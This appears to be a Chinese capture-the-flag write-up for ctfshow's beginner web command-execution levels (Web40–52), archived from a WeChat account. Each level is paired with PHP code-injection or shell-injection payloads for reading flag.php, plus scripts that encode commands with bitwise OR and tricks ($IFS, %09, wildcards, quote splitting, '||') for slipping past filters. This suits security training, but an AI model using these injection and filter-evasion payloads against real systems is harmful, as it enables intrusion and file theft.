---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  ctfshow web入门 命令执行2  
原创 zoe
                    zoe  哦0吼   2026-02-10 05:00  
  
Web40  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsExcTB6EICbYeriab9G0UiaQpWKwnKBI9Dv3qhyJkwxr7vbs1fNWV932pTRVibNYufIlIrYfJKYNPOHZCcCiaQePBFbus4MQmk5icZKU/640?wx_fmt=png "")  
  
过滤了很多，只有字母，空格，分号，英文括号等能用（注意：正则中过滤的是正文括号）  
  
   
  
get_defined_vars()：PHP 内置函数，返回当前所有已定义变量的数组（包含$_GET/$_POST/$_COOKIE等）；  
  
执行/?c=print_r(get_defined_vars());可以看到变量，我们可以利用post  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExmL6qD3nIribChJj1ricX7Efx5TpduNY4dQWkgFtZtcjPIopHNgSGJ2kZCHypvagaqzF2qNdia1LuJKmCuY1SD4lfjLRVSLKB68c/640?wx_fmt=png "")  
  
next()：将数组指针移动到下一个元素并返回其值（这里定位到$_POST数组）；  
  
array_pop()：弹出数组最后一个元素（这里提取$_POST里的代码内容）。  
  
   
  
GET传参：  
    
/?c=eval(array_pop(next(get_defined_vars())));  
  
POST传参： 1=echo file_get_contents ('flag.php');  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzu6g5bg4gJhB1FLgfhhn8gJgDelh2yqMktyQa7VxOZSvkHXIA1Ea2rbc6oe7vl8ibn2tm74t4iaMaxP4V4TIJZgIM09vib4FMv6Q/640?wx_fmt=png "")  
  
   
  
查看源码得到flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEzEUavVuBRC0hwHticluLE4iaXJcKwk9jz3RtT3WovYsibBibpyGCOa2646FBnId2ah53H9Yia1Mu9ibTOvqjYGAxmicUuRjEsqlQvWa0/640?wx_fmt=png "")  
  
其他方法：  
c=show_source(next(array_reverse(scandir(pos(localeconv())))));  
  
参考  
无参数读文件和RCE总结 - FreeBuf网络安全行业门户  
  
Web41  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzecRB5NrNWiafNRHS4hgzvLYKeL8qyGrk2z2XgapU5AvRVVSave5EGPpy6nXCYRpjMMDWUP4ZcfVDBMbhImmavPB36YQG1ydIM/640?wx_fmt=png "")  
  
   
  
这里字母也进行了过滤，异或过滤了但或运算没有过滤，所以可以使用或运算过滤  
  
   
  
脚本：  
  
$myfile = fopen("res_xor.txt", "w");            
  
$contents="";            
  
for ($i=0; $i < 256; $i++) {            
  
      
for ($j=0; $j <256 ; $j++) {            
  
  
          
if($i<16){            
  
              
$hex_i='0'.dechex($i);            
  
          
}            
  
          
else{            
  
              
$hex_i=dechex($i);            
  
          
}            
  
          
if($j<16){            
  
              
$hex_j='0'.dechex($j);            
  
          
}            
  
          
else{            
  
              
$hex_j=dechex($j);            
  
          
}            
  
          
$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';//根据题目给的正则表达式修改即可            
  
          
if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){            
  
              
echo "";            
  
          
}            
  
  
          
else{            
  
              
$a='%'.$hex_i;            
  
              
$b='%'.$hex_j;            
  
              
$c=(urldecode($a)|urldecode($b));            
  
              
if (ord($c)>=32&ord($c)<=126) {            
  
                  
$contents=$contents.$c." ".$a." ".$b."\n";            
  
              
}            
  
          
}            
  
  
      
}            
  
}            
  
fwrite($myfile,$contents);            
  
fclose($myfile);  
  
   
  
   
  
   
  
import requests  
  
import urllib  
  
from sys import *  
  
import os  
  
   
  
def action(arg):  
  
    s1 = ""  
  
    s2 = ""  
  
    for i in arg:  
  
        f = open("res_xor.txt", "r")  
  
        while True:  
  
            t = f.readline()  
  
            if t == "":  
  
                break  
  
            if t[0] == i:  
  
                # print(i)  
  
                s1 += t[2:5]  
  
                s2 += t[6:9]  
  
                break  
  
        f.close()  
  
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"  
  
    return (output)  
  
   
  
while True:  
  
    param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"  
  
print(param)  
  
   
  
   
  
   
  
POST传参  
  
   
  
[+] your function：file_get_contents  
  
[+] your command：flag.php  
  
   
  
C= ("%06%09%0c%05%00%07%05%14%00%03%0f%0e%14%05%0e%14%13"|"%60%60%60%60%5f%60%60%60%5f%60%60%60%60%60%60%60%60")("%06%0c%01%07%00%10%08%10"|"%60%60%60%60%2e%60%60%60")  
  
   
  
[+] your function：readfile  
  
[+] your command：flag.php  
  
   
  
C= ("%12%05%01%04%06%09%0c%05"|"%60%60%60%60%60%60%60%60")("%06%0c%01%07%00%10%08%10"|"%60%60%60%60%2e%60%60%60")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwCjJmCVd4utx3zbSVNKEKd0JPB8kdYDZVnKuujnWpAVm0jOWWVIJjzCKeN03X9uV9kXkMUjp4YQibtGnwib7GsOqfRice3YiaECic0/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEypFKkZNC5FPicyCRk0cJFw9UX832I3iaYcG9dlJzH276flibMmzN81W6wMMgp1mibEtpvmTEIz8GRNZXUxQoIKR5bv4q14PKWk6ww/640?wx_fmt=png "")  
  
Web42  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyNY5ojRkWF4kHwjqnhVSLX6VciblExYH0oTpr9nvKb6CsPAicf8Zvr568vOx86QlecTtFoiaYBerXJ6j9SFicQ8AXJicxrZXHnrRUU/640?wx_fmt=png "")  
  
这里用了重定向  
  
>/dev/null 2>&1：  
  
   
>/dev/null表示将命令的标准输出重定向到/dev/null，也就是不输出任何信息到终端，也就是不显示任何信息；  
  
2>&1表示2的输出重定向等同于1。  
  
意味着无论命令执行结果如何，都不会在页面上显示任何输出信息。  
  
那么想要命令回显，我们可以输入两个命令，并进行命令分隔。  
  
   
  
/?c=ls ||  
  
/?c=cat flag.php ||  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEwvOoyAgAJiaWmWfS6dp0JgaDUqSrPWyGXMMTV9WMT2iaOOfibeON5wnvyDTiaauADhwUSd4Qv7daLs0Wrn8vd2piaLKSQ0m0otzOnU/640?wx_fmt=png "")  
  
Web43  
  
这关和上关比较，就是多过滤了cat 和分号  
  
/?c=tac flag.php ||  
  
   
  
Web44  
  
多过滤了flag  
  
/?c=tac fl* ||  
  
Web45  
  
多过滤了空格，那么可以用%09绕过  
  
/?c=tac%09fl* ||  
  
Web46  
  
过滤了数字，$和*那么可以用通配符？绕过  
  
?c=tac%09fla?.php||  
  
   
  
Web47  
    
web48  
    
web49(  
注意：  
 %09  
是URL编码，PHP接收到时已经解码了！  
)  
  
   
  
多过滤了一些但无影响  
  
还可以用上题payload  
  
?c=tac%09fla?.php||  
  
   
  
Web50  
  
%09被ban了，那么用  
  
/?c=tac <fla’’g.php||  
  
（不知道为啥  
/?c=tac<fla?.php||   
不行）  
  
Web51  
  
过滤了tac，但nl还能用。  
  
/?c=nl<fla%27%27g.php||  
  
   
  
Web52  
  
   
  
多过滤了<和>，但是没过滤$。   
  
?c=ta''c$IFS/fla’’g||   
  
?c=tac       
  
?c=nl${IFS}/fl''ag||  
  
   
  
   
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
